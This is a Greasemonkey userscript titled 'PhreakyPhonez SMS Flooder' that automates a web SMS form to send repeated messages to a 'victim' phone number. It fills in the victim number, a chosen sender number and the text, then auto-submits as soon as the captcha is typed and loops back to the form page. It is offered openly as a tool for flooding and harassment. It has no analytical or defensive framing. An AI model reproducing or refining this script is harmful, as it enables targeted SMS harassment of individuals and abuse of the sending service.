// ==UserScript==
// @name           PhreakyPhonez SMS Flooder
// @namespace      Orkut Underground 13
// @description    Floods SMS's I Guess :-??
// @include        http://phreakyphonez.net/sms/index.asp
// @include        http://phreakyphonez.net/sms/send.asp
// ==/UserScript==

if(document.location=="http://phreakyphonez.net/sms/send.asp")
{
	document.location="http://phreakyphonez.net/sms/index.asp";
}
else
{
	var victim="10 Digit Number"; //Victim's Mobile Number :P
	var sender="Number With Country Code"; //Sender's Number :D
	var ccode="91"; //For India 91...Pakistan 92...
	var sms="Text Here";
	
	document.location="javascript:document.forms[1].elements[9].checked=true;document.forms[1].elements[1].value='93';void(0);";
	
	document.forms[1].elements[3].value=ccode;
	document.forms[1].elements[4].value=victim;
	document.forms[1].elements[5].value=sender;
	document.forms[1].elements[6].value=sms;
	document.forms[1].elements[8].focus();
	document.getElementById('securityCode').setAttribute("onkeyup","javascript:if(document.getElementById('securityCode').value.length==5){document.forms[1].elements[11].click();}void(0)");
}
	